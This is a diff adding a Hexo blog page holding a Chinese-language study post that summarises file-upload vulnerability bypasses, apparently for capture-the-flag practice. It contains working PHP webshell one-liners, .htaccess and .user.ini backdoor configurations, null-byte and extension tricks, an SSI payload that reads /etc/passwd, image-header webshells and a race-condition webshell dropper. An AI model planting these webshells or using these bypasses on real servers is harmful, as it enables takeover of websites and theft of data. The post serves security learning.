@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="写在前面： 文件上传漏洞常用于获取webshell，从而取得对目标网站(系统)的控制权。要获取shell，需要： 1.知道上传后文件所保存位置(不知道那就猜、爆破，一般是能知道的) 2.上传后文件的名字(是否被更改)  一句话木马(webshell): 1&lt;?php eval($_POST[&amp;#x27;passwd&amp;#x27;]);?&gt; 一句话木马原理及不同类型：https:&#x2F;&#x2F;bai">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传（总结和缝合）">
+<meta property="og:url" content="http://example.com/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hack the world">
+<meta property="og:description" content="写在前面： 文件上传漏洞常用于获取webshell，从而取得对目标网站(系统)的控制权。要获取shell，需要： 1.知道上传后文件所保存位置(不知道那就猜、爆破，一般是能知道的) 2.上传后文件的名字(是否被更改)  一句话木马(webshell): 1&lt;?php eval($_POST[&amp;#x27;passwd&amp;#x27;]);?&gt; 一句话木马原理及不同类型：https:&#x2F;&#x2F;bai">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-03T12:39:43.265Z">
+<meta property="article:modified_time" content="2022-04-03T12:44:26.538Z">
+<meta property="article:author" content="D0gekong">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/","path":"2022/04/03/PHP/文件上传（总结和缝合）/","title":"文件上传（总结和缝合）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件上传（总结和缝合） | Hack the world</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hack the world</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fake it till Make it</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D0gekong"
+      src="/images/pic.jpg">
+  <p class="site-author-name" itemprop="name">D0gekong</p>
+  <div class="site-description" itemprop="description">散人的漫漫学习路</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SantaJiang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SantaJiang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/jiangshengda@foxmail.com" title="E-Mail → jiangshengda@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/3aa0cb901bee" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3aa0cb901bee" rel="noopener" target="_blank"><i class="fab fa-jianshu fa-fw"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jsd581?spm=1010.2135.3001.5421" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jsd581?spm&#x3D;1010.2135.3001.5421" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传（总结和缝合）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-03 20:39:43 / 修改时间：20:44:26" itemprop="dateCreated datePublished" datetime="2022-04-03T20:39:43+08:00">2022-04-03</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>写在前面：</p>
+<p>文件上传漏洞常用于获取<code>webshell</code>，从而取得对目标网站(系统)的控制权。要获取<code>shell</code>，需要： 1.知道上传后文件所保存位置(不知道那就猜、爆破，一般是能知道的) 2.上传后文件的名字(是否被更改) </p>
+<p>一句话木马(webshell):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;passwd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>一句话木马原理及不同类型：<code>https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?fr=aladdin</code></p>
+<p>毫无过滤</p>
+<ul>
+<li><p>直接上传即可获取<code>webshell</code><br>两种校验方式</p>
+</li>
+<li><p>客户端校验(javascript校验)</p>
+</li>
+<li><p>服务端校验<br>客户端校验：</p>
+</li>
+</ul>
+<p>绕过方法</p>
+<ul>
+<li><p>抓包改包</p>
+</li>
+<li><p>禁用JS<br>禁用JS</p>
+</li>
+<li><p>如果是弹窗提示，打开控制台-&gt;网络，上传时没有请求发出去，说明是在本地校验</p>
+</li>
+<li><p>火狐插件-yescript2</p>
+</li>
+<li><p>老版本可以使用WebDeveloper<br>抓包改包</p>
+</li>
+<li><p>用bp抓包后直接改后缀名<br>绕过js过滤：</p>
+</li>
+</ul>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传jpg、png、gif结尾的图片噢！&quot;;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：</p>
+<ul>
+<li>在控制台重新定义函数 <code>function checkFile()&#123;&#125;</code> 回车即可(<strong>注：需要在未触发该函数前</strong>) </li>
+<li>将一句话木马文件后缀改为<code>.png .jpg .gif</code>后，点击上传。用<code>BurpSuite</code>截断，然后将文件名再替换成<code>.php</code><br>后端过滤：</li>
+</ul>
+<p>利用解析漏洞绕过</p>
+<pre><code>* `IIS`解析漏洞
+</code></pre>
+<blockquote>
+<p>IIS 6.0在解析文件时存在以下两个解析漏洞。<br>当建立*.asa、*.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件来解析。<br>例如：建立文件夹parsing.asp，在parsing.asp文件夹内新建一个文本文档test.txt，其内容为&lt;%=NOW()%&gt;，然后在浏览器内访问。<br>“NOWO”是ASP提供获取当前时间的函数，TXT是文本文档格式，IIS是不会去解析此类文件的，应该会直接显示其内容，而在parsing.asp文件夹中，却被当作ASP脚本来解析。<br>当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行，如：新建文件test.asp;1.jpg，内容为&lt;%=NOW()%&gt;。<br>    * <code>Apache</code>解析漏洞<br>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断，如xxx.php.owf.rar ，”.owf”和”.rar”这两种后缀是apache解析不了的，apache就会把xxx.php.owf.rar解析成php。<br>怎么去判断是不是合法的后缀就是这个漏洞利用关键，测试时把常见的后缀都写上，去测试是不是合法，任意不识别的后缀，逐级向上识别。<br>有些程序开发人员在上传文件时，判断文件名是否是PHP、ASP、ASPX、ASA、CER、ASPX等脚本扩展名，如果是，则不允许上传，这时攻击者就有可能上传1.php.rar等扩展名来绕过程序检测，并配合解析漏洞，获取到WebShell。<br>    * <code>Nginx</code>解析漏洞<br>解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php<br>描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br>还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
+</blockquote>
+<h3 id><a href="#" class="headerlink" title></a></h3><p>猜测过滤规则绕过：</p>
+<ul>
+<li><p>文件后缀名黑名单：</p>
+</li>
+<li><p>大小写绕过 <code>Php、PhP···</code></p>
+</li>
+<li><p>利用能被解析的后缀名，例如<code>php、php3、php4、php5、php7、pht、phtml、phps</code></p>
+</li>
+<li><p>配合Apache的.htaccess文件上传解析，该文件可以理解为Apache的分布式配置文件，在一个特定的文档中放置，以作用于此目录及其所有子目录。管理员可以通过Apache的AllowOverride指令来设置<code>/etc/apache2/apache2.conf</code>，默认是NONE，需要为ALL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMacth&gt;  </span><br></pre></td></tr></table></figure>
+<p>假如不能写<code>&lt;?</code>时使用伪协议 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .123</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.123&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>.user.ini</code>上传<br>条件：</p>
+</li>
+<li><p>1、服务器脚本语言为PHP</p>
+</li>
+<li><p>2、服务器使用CGI／FastCGI模式</p>
+</li>
+<li><p>3、上传目录下要有可执行的php文件<br>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache </p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11455355.html#%E5%88%A9%E7%94%A8.user.ini%E4%B8%8A%E4%BC%A0%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8">刷题记录：[SUCTF 2019]CheckIn</a></p>
+<ul>
+<li><p>使用00截断（需要magic_quotes_gpc=Off）<br>基于一个组合逻辑漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = getname(http request)//假如这时候获取到的文件名是test.asp.jpg(asp后面为0x00)</span><br><span class="line">type = gettype(name)//而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg</span><br><span class="line">if(type==jpg)</span><br><span class="line">SaveFileToPath(UploadPath.name,name)</span><br></pre></td></tr></table></figure>
+<p>在第一个后缀名后加一个空格(0x20)，使用bp-&gt;repeater-&gt;hex，将其改成0x00</p>
+</li>
+<li><p>超长文件名截断上传(windows 258byte | linux 4096byte)<br>使用./或.</p>
+</li>
+<li><p><code>shtml</code><br>当Web服务器为Apache和IIS（支持SSI功能的服务器）且开启了SSI与CGI支持<br><code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></p>
+</li>
+<li><p> MIME类型绕过</p>
+<blockquote>
+<p><code>BurpSuite</code>抓包,更改<code>content-type</code>请求头为<code>image/gif、image/png、image/jpg</code></p>
+</blockquote>
+</li>
+<li><p> 图片马内容检测<br>根据过滤内容来调整,例如&lt;?被过滤，调整为<code>&lt;% eval request(&quot;123&quot;)%&gt;</code>等等 </p>
+</li>
+<li><p>文件内容头检测<br>上述方法均失效时可以考虑一下网站是否检测了文件头</p>
+</li>
+</ul>
+<p>解决方法1：添加图片文件头到木马文件</p>
+<p><code>GIF89a? &lt;% eval request(&quot;123&quot;)%&gt;</code></p>
+<p>文件头对照参考：<code>https://blog.csdn.net/rrrfff/article/details/7484109</code></p>
+<p>解决方法2：将一张图片与一句话木马文件结合</p>
+<p>1.记事本打开图片，在末尾或者之中添加一句话木马 2.使用命令将图片与木马文件结合 </p>
+<p><a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html">https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例子：GIF89a</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>竞争上传<br>文件上传后，网站系统会对文件进行恶意代码检测，若是存在恶意代码，则会删除该文件</li>
+</ul>
+<p>若在这个操作的时间之内，访问该上传的文件，利用之间的时间差来获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &#x27;web.php&#x27;;</span><br><span class="line">$shell = &#x27;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#x27;;</span><br><span class="line">file_put_contents($file,$shell);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>.user.ini</code> 利用 (注：上传目录下要有可执行的<code>php</code>文件，一般是自带的，而不是自己上传的，要是可以的话，还需要这么多骚操作干什么)<br>大佬教程：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p> 例子</p>
+<p> <a target="_blank" rel="noopener" href="https://github.com/backlion/demo/blob/master/lfi_phpinfo.py">https://github.com/backlion/demo/blob/master/lfi_phpinfo.py</a></p>
+<ul>
+<li><p>Apache的.htaccess<br>教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hmbb/p/9689436.html">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
+</li>
+<li><p>php崩溃导致tmp文件保留<br>当存在<code>include</code>的时候，传入<code>file=php://filter/string.strip_tags/resource=/etc/passwd</code>会导致Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除。但是这时还需要知道tmp目录下的文件名 </p>
+</li>
+<li><p>过滤<code>&lt;?</code>或<code>php</code><br>js标签绕过，需要php小于7.0</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;PHP&quot;&gt;</span><br><span class="line">$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&#x27;r&#x27;);</span><br><span class="line">echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));</span><br><span class="line">fclose($fh);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_?&gt;</code>输出变量，在PHP 5.4 之后默认支持<br>常见的一句话木马(PHP):</p>
+<ul>
+<li><code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code> <strong>比较好用</strong></li>
+<li><code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code></li>
+<li><code>&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入&quot;h=@eval($_POST[c]);&quot;</code></li>
+<li><code>&lt;?php $c=&#39;ass&#39;.&#39;ert&#39;;$&#123;c&#125;($_POST[4]);?&gt;</code></li>
+</ul>
+<p>常见文件名对应的MIME类型：</p>
+<pre><code>* 扩展名：gif MIME类型：image/gif
+* 扩展名：png MIME类型：image/png
+* 扩展名：jpg MIME类型：image/jpg
+* 扩展名：js MIME类型：text/javascript
+* 扩展名：htm MIME类型：text/html
+* 扩展名：html MIME类型：text/html
+</code></pre>
+<p>参考网站：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42636435/article/details/88096844">https://blog.csdn.net/qq_42636435/article/details/88096844</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7531">https://xz.aliyun.com/t/7531</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/10989689.html">https://www.cnblogs.com/20175211lyz/p/10989689.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/85334893">https://blog.csdn.net/weixin_39190897/article/details/85334893</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/" rel="prev" title="伪协议php(总结和缝合）">
+                  <i class="fa fa-chevron-left"></i> 伪协议php(总结和缝合）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/04/03/PHP/File%E5%8D%8F%E8%AE%AE%E5%B0%8Ftrick/" rel="next" title="File协议小trick">
+                  File协议小trick <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0gekong</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
